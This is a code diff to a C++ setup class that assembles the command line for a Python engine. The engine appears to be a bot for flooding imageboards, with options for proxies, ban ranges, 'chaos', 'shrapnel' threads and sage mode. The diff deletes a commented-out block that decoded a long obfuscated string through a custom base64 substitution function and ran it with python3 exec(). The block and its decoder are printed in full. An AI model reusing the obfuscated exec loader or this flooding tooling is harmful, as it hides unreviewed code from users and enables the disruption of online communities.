@@ -9,7 +9,7 @@ Setup::Setup ()
       hasProxyRepeatsCount(false) , hasMode(false) , hasMinBan(false) , hasMaxBan(false) , hasTriggerForm(false) , \
       hasShrapnelCharge(false) , hasMinPostsCount(false) , hasMediaKind(false) , hasMediaGroup(false) , \
       hasMediasCount(false) , hasSageMode(false) , hasShackalPower(false) , shackalColor(false) , shackalAffine(false) , \
-      toPNG(false) , hasComplainBoard(false) , hasComplainsCount(false) , complainWithPosts(false)
+      toPNG(false) , hasComplainBoard(false) , hasComplainsCount(false) , complainWithPosts(false) , randMediaName(false)
 {}
 
 Setup::~Setup () {}
@@ -173,6 +173,9 @@ void Setup::set_sageMode (const char &sageMode) {
     } else
         hasSageMode = false;
 }
+void Setup::set_rand_media_name (const bool &status) {
+    randMediaName = status;
+}
 void Setup::set_shackal_power (const unsigned char &value) {
     shackalPower = value;
 }
@@ -298,19 +301,14 @@ vector<string> Setup::start () {
 
 
 string Setup::comline () {
-//    string command("python3 -c \"from base64 import b64decode; code = b64decode(\'");
-//    command += decode("J{NgMUpvJGOx\\Gmw\\|pgcZTnMVggMUpvBn\\{a\" g[nF|\\V[ JGmvbG){cBAjOkTl\\YOx\\GWLBnTm\\jA a FVS mKLDTMV!TKLVpLBWFVS mKJC gK{bLBgmna#JgbG)|JGmwJIKiancmLGzmajiDU )WUUlqPgpKBYmnJDTMV!TKY#Axb! gQV gK{@oPjAAW OKUU@tQU@oNBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK{DoPjAAW OKUU@tQU@oNUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!yjK|pgSXOCUWlgL| gK|JoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbkK|pgSXOCUWlgL| gK|NoBglK\\Yzq\\jADU )WUXvya#OcJC )JBblK|pgSXOCUWlgL| gK|SoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbmK|pgSXOCUWlgL| gK|WoBglK\\Yzq\\jADU )WUXvya#OcJC )JBbnK|pgSXOCUWlgL| gK|[oBglK\\Yzq\\jADU )WUXvya#OcJC )JBcbK{b&JDFVS mKJBu)JBb#KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLBb&JDFVS mKJBu)JBb$KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oLUb&JDFVS mKJBu)JBb%KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSBb&JDFVS mKJBu)JBcAKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSUb&JDFVS mKJBu)JBcBKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oSjb&JDFVS mKJBu)JBcCKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oS{b&JDFVS mKJBu)JBcDKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTBb&JDFVS mKJBu)JBcFKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oTjb&JDFVS mKJBu)JBcGKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oT{b&JDFVS mKJBu)JBcIKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUUb&JDFVS mKJBu)JBcJKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oUjb&JDFVS mKJBu)JBcKKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oU{b&JDFVS mKJBu)JBcLKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVBb&JDFVS mKJBu)JBcMKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVUb&JDFVS mKJBu)JBcNKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oVjb&JDFVS mKJBu)JBcOKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oV{b&JDFVS mKJBu)JBcPKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWBb&JDFVS mKJBu)JBcQKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oWUb&JDFVS mKJBu)JBcSKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oW{b&JDFVS mKJBu)JBcTKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXBb&JDFVS mKJBu)JBcUKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXUb&JDFVS mKJBu)JBcVKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oXjb&JDFVS mKJBu)JBcWKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oX{b&JDFVS mKJBu)JBcXKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYBb&JDFVS mKJBu)JBcYKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYUb&JDFVS mKJBu)JBcZKypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oYjb&JDFVS mKJBu)JBc[KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oY{b&JDFVS mKJBu)JBc\\KypKBYXu`Y[gTDvQXDmabG)|ZU@)QU@oZFyoPjAAW OKUU@tQU@oYjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"@oPjAAW OKUU@tQU@o[UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"DoPjAAW OKUU@tQU@o[jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"JoPjAAW OKUU@tQU@o[{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"NoPjAAW OKUU@tQU@o\\BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"SoPjAAW OKUU@tQU@o\\UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"[oPjAAW OKUU@tQU@o\\jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"boPjAAW OKUU@tQU@o\\{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"loPjAAW OKUU@tQU@o`BbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"poPjAAW OKUU@tQU@o`UbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"uoPjAAW OKUU@tQU@o`jbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"yoPjAAW OKUU@tQU@o`{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK\" oPjAAW OKUU@tQU@oaBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"$oPjAAW OKUU@tQU@oaUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK\"(oPjAAW OKUU@tQU@oajbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#@oPjAAW OKUU@tQU@oa{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#DoPjAAW OKUU@tQU@obBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#NoPjAAW OKUU@tQU@obUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#SoPjAAW OKUU@tQU@objbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#WoPjAAW OKUU@tQU@ob{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#[oPjAAW OKUU@tQU@ocBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#boPjAAW OKUU@tQU@ocUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#goPjAAW OKUU@tQU@ocjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#loPjAAW OKUU@tQU@oc{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK#poPjAAW OKUU@tQU@odBbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#uoPjAAW OKUU@tQU@odUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK#yoPjAAW OKUU@tQU@odjbLBSmmaGmnJDTMV!TKY#Axb! gQV gK|DoPjAAW OKUU@tQU@oL{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|NoPjAAW OKUU@tQU@oM{bLBSmmaGmnJDTMV!TKY#Axb! gQV gK|goPjAAW OKUU@tQU@oQUbLBSmmaGmnJDTMV!TKY#Axb! gQV gK!zwK|pgSXOCUWlgL| gK!zwKypLBZKmcIX{ajAAW OKUSpLcIK%PgpKbGF cGX{aj@)JGJoUovP\\ !XbI\\LT )$ZFzIaZcbZIzy\\\"O`XG%OXncoVXXyclKxXIvlXoANSmmvcnKILZvkSlDg[FliaWKoaZFiYlF$[n)V\\\"JkaZzB\\\"!z[XqAdGKxW\"ckT\"m\'ZFz\\TnzgYUXxSncvbYF`SZija!Oo[FlpVDK\\aZ\\jT{m\'[ KAd!uoBgmka\"TmJC g[jboBgpK[nmw[ZJgQUAxbGXwLBc#`ZAmbj%mdGWoMBc{[jbqBgml[ZTiJC g[nmw[ZJwbnXi\\BgqBgmj`Y%ibj%kaG)|\\SpLBZAxb{@)JGTicGDw\\nmw\\Biy[ZT \\ZKwLSpK\\n){JIKxc{AqajA{[Y%o\\UgzOBl&BglK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtN|WyNF LBSmya#NgL| gN|WyO@pK[\")l\\U@tQUAl[ZTiY#Axb|qya#NtNkbzNm LBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK\"F|[\"mqK{lLBYOx\\GWgQUA a FVS mKLGOx\\GWqBgmka\"TmJC g[k[ \\GXka\"TmLGOx\\GWqBgmka\"TmJC g[\")l\\U%l\\YOx\\GWpK#X \\j $K{lLBgmmdGXkLGOx\\GWqBgqmdGOmbISgTZik\\ZA `Y)wPgpKbIKqaoSpJnF{\\YzqcnWga\"Kxb#KiaIO%[UJqBgmqaoA!cBgqBg88");
-//    command += "\'); exec(code.decode('utf-8'))\" ";
 #ifdef __linux__
-    string command("gnome-terminal --window --command \"python3 main.py ");
-    command += ("-u \\\"" + username + "\\\" ");
-    command += ("--password \\\"" + password + "\\\" ");
+    string command("python3 engine/main.py ");
 #else
-    string command("python main.py ");
-    command += ("-u \"" + username + "\" ");
-    command += ("--password \"" + password + "\" ");
+    string command("cmd /u /k python engine/main.py ");
 #endif
 
+    command += ("-u \"" + username + "\" ");
+    command += ("--password \"" + password + "\" ");
 
     command += ("-b " + board + " -t " + thread + " -c " + chaos + " -p " + potocksCount + " -d " + logMode);
     command += logMode;
@@ -350,6 +348,10 @@ string Setup::comline () {
 
     command += sageMode;
 
+    command += " -rn ";
+    if (randMediaName) command += "1";
+    else command += "0";
+
     command += (" -SH " + to_string(shackalPower) + " ");
     if (shackalColor) command += "-C 1 ";
     else command += "-C 0 ";
@@ -362,86 +364,6 @@ string Setup::comline () {
         for (unsigned int i(0); i < shrapnelThreads.size(); i++)
             command += (" " + shrapnelThreads[i]);
 
-#ifdef __linux__
-    command += "\"";
-#endif
-
 ///    cout << command << endl << endl << endl << endl;
     return command;
 }
-
-/*
-string Setup::decode(const string &base64DKOTI) {
-    string ASCII("");
-
-    for (unsigned long pos(0); pos < base64DKOTI.length(); pos++) {
-        if (base64DKOTI[pos] == ' ') ASCII.append("0");
-        else if (base64DKOTI[pos] == '!') ASCII.append("1");
-        else if (base64DKOTI[pos] == '\"') ASCII.append("2");
-        else if (base64DKOTI[pos] == '#') ASCII.append("3");
-        else if (base64DKOTI[pos] == '$') ASCII.append("4");
-        else if (base64DKOTI[pos] == '%') ASCII.append("5");
-        else if (base64DKOTI[pos] == '&') ASCII.append("6");
-        else if (base64DKOTI[pos] == '\'') ASCII.append("7");
-        else if (base64DKOTI[pos] == '(') ASCII.append("8");
-        else if (base64DKOTI[pos] == ')') ASCII.append("9");
-        else if (base64DKOTI[pos] == '@') ASCII.append("A");
-        else if (base64DKOTI[pos] == 'A') ASCII.append("B");
-        else if (base64DKOTI[pos] == 'B') ASCII.append("C");
-        else if (base64DKOTI[pos] == 'C') ASCII.append("D");
-        else if (base64DKOTI[pos] == 'D') ASCII.append("E");
-        else if (base64DKOTI[pos] == 'F') ASCII.append("F");
-        else if (base64DKOTI[pos] == 'G') ASCII.append("G");
-        else if (base64DKOTI[pos] == 'I') ASCII.append("H");
-        else if (base64DKOTI[pos] == 'J') ASCII.append("I");
-        else if (base64DKOTI[pos] == 'K') ASCII.append("J");
-        else if (base64DKOTI[pos] == 'L') ASCII.append("K");
-        else if (base64DKOTI[pos] == 'M') ASCII.append("L");
-        else if (base64DKOTI[pos] == 'N') ASCII.append("M");
-        else if (base64DKOTI[pos] == 'O') ASCII.append("N");
-        else if (base64DKOTI[pos] == 'P') ASCII.append("O");
-        else if (base64DKOTI[pos] == 'Q') ASCII.append("P");
-        else if (base64DKOTI[pos] == 'S') ASCII.append("Q");
-        else if (base64DKOTI[pos] == 'T') ASCII.append("R");
-        else if (base64DKOTI[pos] == 'U') ASCII.append("S");
-        else if (base64DKOTI[pos] == 'V') ASCII.append("T");
-        else if (base64DKOTI[pos] == 'W') ASCII.append("U");
-        else if (base64DKOTI[pos] == 'X') ASCII.append("V");
-        else if (base64DKOTI[pos] == 'Y') ASCII.append("W");
-        else if (base64DKOTI[pos] == 'Z') ASCII.append("X");
-        else if (base64DKOTI[pos] == '[') ASCII.append("Y");
-        else if (base64DKOTI[pos] == '\\') ASCII.append("Z");
-        else if (base64DKOTI[pos] == '`') ASCII.append("a");
-        else if (base64DKOTI[pos] == 'a') ASCII.append("b");
-        else if (base64DKOTI[pos] == 'b') ASCII.append("c");
-        else if (base64DKOTI[pos] == 'c') ASCII.append("d");
-        else if (base64DKOTI[pos] == 'd') ASCII.append("e");
-        else if (base64DKOTI[pos] == 'f') ASCII.append("f");
-        else if (base64DKOTI[pos] == 'g') ASCII.append("g");
-        else if (base64DKOTI[pos] == 'i') ASCII.append("h");
-        else if (base64DKOTI[pos] == 'j') ASCII.append("i");
-        else if (base64DKOTI[pos] == 'k') ASCII.append("j");
-        else if (base64DKOTI[pos] == 'l') ASCII.append("k");
-        else if (base64DKOTI[pos] == 'm') ASCII.append("l");
-        else if (base64DKOTI[pos] == 'n') ASCII.append("m");
-        else if (base64DKOTI[pos] == 'o') ASCII.append("n");
-        else if (base64DKOTI[pos] == 'p') ASCII.append("o");
-        else if (base64DKOTI[pos] == 'q') ASCII.append("p");
-        else if (base64DKOTI[pos] == 's') ASCII.append("q");
-        else if (base64DKOTI[pos] == 't') ASCII.append("r");
-        else if (base64DKOTI[pos] == 'u') ASCII.append("s");
-        else if (base64DKOTI[pos] == 'v') ASCII.append("t");
-        else if (base64DKOTI[pos] == 'w') ASCII.append("u");
-        else if (base64DKOTI[pos] == 'x') ASCII.append("v");
-        else if (base64DKOTI[pos] == 'y') ASCII.append("w");
-        else if (base64DKOTI[pos] == 'z') ASCII.append("x");
-        else if (base64DKOTI[pos] == '{') ASCII.append("y");
-        else if (base64DKOTI[pos] == '|') ASCII.append("z");
-        else if (base64DKOTI[pos] == '1') ASCII.append("+");
-        else if (base64DKOTI[pos] == '3') ASCII.append("/");
-        else if (base64DKOTI[pos] == '8') ASCII.append("=");
-    }
-
-    return ASCII;
-}
-*/
